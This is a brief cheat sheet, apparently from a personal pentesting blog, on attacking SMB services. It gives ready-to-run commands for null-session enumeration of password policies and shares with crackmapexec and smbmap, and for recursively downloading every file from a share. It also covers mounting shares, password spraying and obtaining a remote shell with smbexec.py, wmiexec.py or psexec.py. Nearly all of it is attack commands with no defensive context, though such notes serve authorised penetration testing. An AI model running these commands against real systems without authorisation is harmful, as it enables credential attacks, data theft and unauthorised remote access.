---
layout:     post
author:     0x5c4r3
type: docs
permalink: Smb_Pentesting
---


<span style="font-size: 35px; color:red"><b>SMB Pentesting</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Check Password Policy</b></span>
```shell
crackmapexec smb <IP> --pass-pol -u '' -p ''
```

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Get Information on Shares</b></span>
```shell
crackmapexec smb <IP> --shares -u '' -p ''
```

```shell
smbmap -H <ip> -u '' -p ''
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Download all files from share</b></span>
Connect throough SMBClient and run these commands:
`# recurse ON`
`# prompt OFF`
`# mget *`

To find only files downloaded:
```shell
find . -type f
```

OR
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Mount the share on .mnt</b></span>
```shell
sudo mount -t cifs '//<IP>/<SHARE>' /mnt -o username=<user>,password=<password>,domain=<domain>
```

---
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>SMB Password Spray</b></span>
```shell
crackmapexec smb <IP> -u <USER_LIST> -p  <PASSWORD> --continue-on-success
```


---
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Get a revshell when having rights on SMB</b></span>

```
smbexec.py <user>:<password>@<ip>
```
if not working you can use `wmiexec.py` or `psexec.py`.
